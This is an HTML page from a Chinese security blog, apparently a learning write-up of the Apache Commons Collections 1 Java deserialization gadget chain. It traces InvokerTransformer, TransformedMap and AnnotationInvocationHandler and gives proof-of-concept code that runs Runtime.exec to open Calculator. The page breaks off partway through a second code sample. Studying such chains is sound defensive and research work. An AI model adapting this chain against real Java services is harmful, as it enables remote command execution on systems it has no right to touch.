@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>CommonsCollections1链详解 - N1Rvana&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法
+很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的
+构造一个简单的 payload 试试 new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime()); ``
+找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法
+valueTransformer变量可控
+但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用
+再查看一下哪里调用了checkSetValue()方法，只有这一处
+setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通
+1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法
+这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
+1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String." /><meta name="keywords" content='CommonsCollections' /><meta itemprop="name" content="CommonsCollections1链详解">
+<meta itemprop="description" content="CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法
+很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的
+构造一个简单的 payload 试试 new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime()); ``
+找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法
+valueTransformer变量可控
+但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用
+再查看一下哪里调用了checkSetValue()方法，只有这一处
+setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通
+1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法
+这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
+1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String."><meta itemprop="datePublished" content="2024-01-14T23:37:48+08:00" />
+<meta itemprop="dateModified" content="2024-01-14T23:37:48+08:00" />
+<meta itemprop="wordCount" content="353"><meta itemprop="image" content="https://nlrvana.github.io/avatar.png" />
+<meta itemprop="keywords" content="CommonsCollections," /><meta property="og:title" content="CommonsCollections1链详解" />
+<meta property="og:description" content="CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法
+很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的
+构造一个简单的 payload 试试 new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime()); ``
+找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法
+valueTransformer变量可控
+但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用
+再查看一下哪里调用了checkSetValue()方法，只有这一处
+setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通
+1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法
+这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
+1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nlrvana.github.io/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/" /><meta property="og:image" content="https://nlrvana.github.io/avatar.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-14T23:37:48+08:00" />
+<meta property="article:modified_time" content="2024-01-14T23:37:48+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://nlrvana.github.io/avatar.png" /><meta name="twitter:title" content="CommonsCollections1链详解"/>
+<meta name="twitter:description" content="CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法
+很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的
+构造一个简单的 payload 试试 new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime()); ``
+找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法
+valueTransformer变量可控
+但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用
+再查看一下哪里调用了checkSetValue()方法，只有这一处
+setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通
+1 2 3 4 5 6 7 8 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&#34;key&#34;,&#34;value&#34;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法
+这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc
+1 2 3 4 5 6 7 8 9 10 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String."/>
+<meta name="twitter:site" content="@huahua39079406"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://nlrvana.github.io/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/" /><link rel="prev" href="https://nlrvana.github.io/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/" /><link rel="next" href="https://nlrvana.github.io/thinkphp3.2.3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "CommonsCollections1链详解",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3\/"
+    },"genre": "posts","keywords": "CommonsCollections","wordcount":  353 ,
+    "url": "https:\/\/nlrvana.github.io\/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3\/","datePublished": "2024-01-14T23:37:48+08:00","dateModified": "2024-01-14T23:37:48+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/posts/"
+                    
+                    
+                  ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">CommonsCollections1链详解</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>CommonsCollections1链详解</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/java/" class="post-category" title="Category - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="published on 2024-01-14 23:37:48"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-01-14">2024-01-14</time></span>&nbsp;<span title="353 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="CommonsCollections1链详解">
+            <i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#注">注</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="commonscollections1链详解" class="heading-element">
+  <a href="#commonscollections1%e9%93%be%e8%af%a6%e8%a7%a3" class="heading-mark"></a>CommonsCollections1链详解</h1><p>jdk8源码下载
+<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4"target="_blank" rel="external nofollow noopener noreferrer">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a>
+<strong>漏洞触发点在</strong><code>org.apache.commons.collections.functors.InvokerTransformer</code>
+其中的<code>transform()</code>方法</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142003386.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142003386.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142003386.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142003386.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142003386.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142003386.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>很明显的一个反射调用，其中<code>iMethodName、iParamTypes、iArgs</code>都是可控的变量，便可以调用任意方法和任意参数
+看一下构造器是如何赋值的</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142005500.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142005500.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142005500.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142005500.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142005500.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142005500.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>构造一个简单的 payload 试试
+<code>new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;}).transform(Runtime.getRuntime());</code>
+``</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142007538.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142007538.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142007538.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142007538.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142007538.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142007538.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>找一个任意类调用<code>transforms()</code>方法的方法，这里选择<code>org.apache.commons.collections.map.TransformedMap</code>类的<code>checkSetValue()</code>方法</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142009339.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142009339.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142009339.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142009339.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142009339.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142009339.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142010479.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142010479.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142010479.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142010479.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142010479.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142010479.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><code>valueTransformer</code>变量可控</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142011147.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142011147.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142011147.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142011147.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142011147.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142011147.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但是因为构造器是<code>protected</code>修饰，所以无法直接调用，利用这里的静态方法<code>decorate()</code>进行了调用</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142012194.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142012194.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142012194.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142012194.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142012194.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142012194.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再查看一下哪里调用了<code>checkSetValue()</code>方法，只有这一处</p>
+<p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142022694.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142022694.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142022694.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142022694.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142022694.png?size=large 2x" sizes="auto" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142022694.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><code>setValue()</code>方法调用了<code>checkSetValue()</code>，构造一个<code>payload</code>，看看能不能通</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="p">});</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transformedMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">for</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="w"> </span><span class="n">entry</span><span class="p">:</span><span class="n">transformedMap</span><span class="p">.</span><span class="na">entrySet</span><span class="p">()){</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">entry</span><span class="p">.</span><span class="na">setValue</span><span class="p">(</span><span class="n">r</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
